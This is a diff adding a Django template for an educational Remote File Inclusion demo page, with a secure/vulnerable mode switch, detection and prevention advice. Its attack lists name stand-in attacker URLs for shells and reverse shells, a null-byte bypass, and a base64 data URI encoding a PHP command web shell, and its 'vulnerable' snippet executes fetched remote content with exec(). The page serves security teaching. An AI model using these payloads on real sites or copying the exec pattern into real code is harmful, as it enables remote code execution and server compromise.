@@ -1,0 +1,217 @@
+{% extends "viewer/base.html" %}
+
+{% block title %}RFI Demo - {{ block.super }}{% endblock %}
+
+{% block content %}
+<div class="hero">
+    <h1>🌐 Remote File Inclusion (RFI) Demo</h1>
+    <div class="alert alert-warning">
+        <strong>⚠️ Educational Demo:</strong> This demonstrates RFI vulnerabilities for educational purposes only.
+    </div>
+</div>
+
+<div class="hero">
+    <h2>🎛️ Demo Controls</h2>
+    <form method="GET" style="margin-bottom: 2rem;">
+        <div style="display: grid; grid-template-columns: auto 1fr auto; gap: 1rem; align-items: center; margin-bottom: 1rem;">
+            <label for="mode" style="font-weight: bold;">Mode:</label>
+            <select id="mode" name="mode" style="padding: 0.5rem; border: 1px solid #ddd; border-radius: 4px;">
+                <option value="secure" {% if mode == 'secure' %}selected{% endif %}>🔒 Secure (Default)</option>
+                <option value="vulnerable" {% if mode == 'vulnerable' %}selected{% endif %}>⚠️ Vulnerable (Educational)</option>
+            </select>
+            <span></span>
+        </div>
+        
+        <div style="display: grid; grid-template-columns: auto 1fr auto; gap: 1rem; align-items: center;">
+            <label for="url" style="font-weight: bold;">Remote URL:</label>
+            <input type="text" 
+                   id="url" 
+                   name="url" 
+                   placeholder="e.g., https://example.com/malicious.txt" 
+                   value="{{ url }}"
+                   style="padding: 0.5rem; border: 1px solid #ddd; border-radius: 4px;">
+            <button type="submit" class="btn">🚀 Include</button>
+        </div>
+    </form>
+    
+    {% if mode == 'vulnerable' %}
+    <div class="alert alert-danger">
+        <strong>⚠️ Vulnerable Mode Active:</strong> Remote file inclusion is enabled. Malicious URLs can execute!
+    </div>
+    {% else %}
+    <div class="alert alert-success" style="background-color: #d4edda; border: 1px solid #c3e6cb; color: #155724;">
+        <strong>🔒 Secure Mode Active:</strong> Remote file inclusion is disabled for security.
+    </div>
+    {% endif %}
+</div>
+
+{% if error %}
+<div class="hero">
+    <div class="alert alert-danger">
+        <strong>❌ Error:</strong> {{ error }}
+    </div>
+</div>
+{% endif %}
+
+{% if content %}
+<div class="hero">
+    <h2>📄 Remote File Content{% if url %}: {{ url }}{% endif %}</h2>
+    <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border: 1px solid #ddd; font-family: monospace; white-space: pre-wrap; overflow-x: auto; max-height: 400px; overflow-y: auto;">{{ content }}</div>
+</div>
+{% endif %}
+
+<div class="hero">
+    <h2>🧪 Test Scenarios</h2>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem;">
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #28a745;">
+            <h3>✅ Safe Examples</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li><code>https://httpbin.org/json</code></li>
+                <li><code>https://api.github.com/zen</code></li>
+                <li><code>https://httpbin.org/uuid</code></li>
+                <li><code>https://httpbin.org/base64/SFRUUEJJTiBpcyBhd2Vzb21l</code></li>
+            </ul>
+        </div>
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #ffc107;">
+            <h3>⚠️ Attack Vectors</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li><code>http://evil.com/shell.php</code></li>
+                <li><code>ftp://attacker.com/malicious.php</code></li>
+                <li><code>data://text/plain,&lt;?php phpinfo();?&gt;</code></li>
+                <li><code>http://malicious.site/backdoor.txt</code></li>
+            </ul>
+        </div>
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #dc3545;">
+            <h3>🚨 Advanced Attacks</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li><code>http://evil.com/shell.txt%00.php</code></li>
+                <li><code>https://pastebin.com/raw/malicious</code></li>
+                <li><code>http://attacker.com/reverse_shell.py</code></li>
+                <li><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+</code></li>
+            </ul>
+        </div>
+        
+    </div>
+</div>
+
+<div class="hero">
+    <h2>🛡️ Security Analysis</h2>
+    
+    {% if mode == 'secure' %}
+    <div style="background-color: #d4edda; padding: 1rem; border-radius: 5px; border: 1px solid #c3e6cb;">
+        <h3>🔒 Secure Implementation:</h3>
+        <pre style="background-color: #f8f9fa; padding: 1rem; border-radius: 4px; overflow-x: auto;"><code># Security measures in place:
+def secure_rfi_protection():
+    # ✅ Remote file inclusion disabled
+    # ✅ URL validation and filtering
+    # ✅ Whitelist approach for allowed domains
+    # ✅ Content-type validation
+    # ✅ File size limits
+    # ✅ Timeout controls
+    return "Remote file inclusion blocked for security"</code></pre>
+    </div>
+    {% else %}
+    <div style="background-color: #f8d7da; padding: 1rem; border-radius: 5px; border: 1px solid #f5c6cb;">
+        <h3>⚠️ Vulnerable Implementation:</h3>
+        <pre style="background-color: #f8f9fa; padding: 1rem; border-radius: 4px; overflow-x: auto;"><code># Vulnerable code (DO NOT USE):
+import urllib.request
+response = urllib.request.urlopen(user_url)
+content = response.read().decode('utf-8')
+exec(content)  # EXTREMELY DANGEROUS!
+    
+# ❌ No URL validation
+# ❌ Direct execution of remote content
+# ❌ No timeout controls
+# ❌ Allows arbitrary code execution</code></pre>
+    </div>
+    {% endif %}
+</div>
+
+<div class="hero">
+    <h2>📚 What is Remote File Inclusion (RFI)?</h2>
+    <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border: 1px solid #ddd;">
+        <p>Remote File Inclusion (RFI) is a web vulnerability that allows attackers to include remote files from external servers into the web application. This can lead to:</p>
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem; margin-top: 1rem;">
+            <div>
+                <strong>🔥 Remote Code Execution</strong><br>
+                Execute malicious code from external servers
+            </div>
+            <div>
+                <strong>💾 Data Theft</strong><br>
+                Access sensitive information and databases
+            </div>
+            <div>
+                <strong>🖥️ Server Compromise</strong><br>
+                Complete control over the web server
+            </div>
+            <div>
+                <strong>🦠 Malware Distribution</strong><br>
+                Use server to host and distribute malware
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="hero">
+    <h2>🔍 Detection Methods</h2>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem;">
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #007bff;">
+            <h3>📊 Log Analysis</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li>Monitor for external URLs in parameters</li>
+                <li>Check for unusual outbound connections</li>
+                <li>Look for HTTP requests to suspicious domains</li>
+                <li>Analyze bandwidth usage patterns</li>
+            </ul>
+        </div>
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #6f42c1;">
+            <h3>🚨 Real-time Monitoring</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li>Web Application Firewalls (WAF)</li>
+                <li>Intrusion Detection Systems (IDS)</li>
+                <li>Network monitoring tools</li>
+                <li>File integrity monitoring</li>
+            </ul>
+        </div>
+        
+    </div>
+</div>
+
+<div class="hero">
+    <h2>🛠️ Prevention Methods</h2>
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem;">
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #28a745;">
+            <h3>✅ Secure Coding</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li><strong>Input Validation:</strong> Never trust user input</li>
+                <li><strong>Whitelist Approach:</strong> Only allow specific files</li>
+                <li><strong>Disable Remote Includes:</strong> Turn off allow_url_include</li>
+                <li><strong>Use Absolute Paths:</strong> Avoid dynamic inclusion</li>
+            </ul>
+        </div>
+        
+        <div style="background-color: #f8f9fa; padding: 1rem; border-radius: 5px; border-left: 4px solid #fd7e14;">
+            <h3>🔧 Server Configuration</h3>
+            <ul style="margin: 0.5rem 0; padding-left: 1.5rem;">
+                <li><strong>Firewall Rules:</strong> Block outbound connections</li>
+                <li><strong>PHP Settings:</strong> Disable dangerous functions</li>
+                <li><strong>File Permissions:</strong> Restrict file access</li>
+                <li><strong>Web Server Config:</strong> Limit inclusion capabilities</li>
+            </ul>
+        </div>
+        
+    </div>
+</div>
+
+<div style="margin: 2rem 0; text-align: center;">
+    <a href="{% url 'vulnerability_demo' %}" class="btn">← Back to Demos</a>
+    <a href="{% url 'lfi_demo' %}" class="btn">Try LFI Demo</a>
+    <a href="{% url 'defense_mechanisms' %}" class="btn">🛡️ Learn Defenses →</a>
+</div>
+{% endblock %}
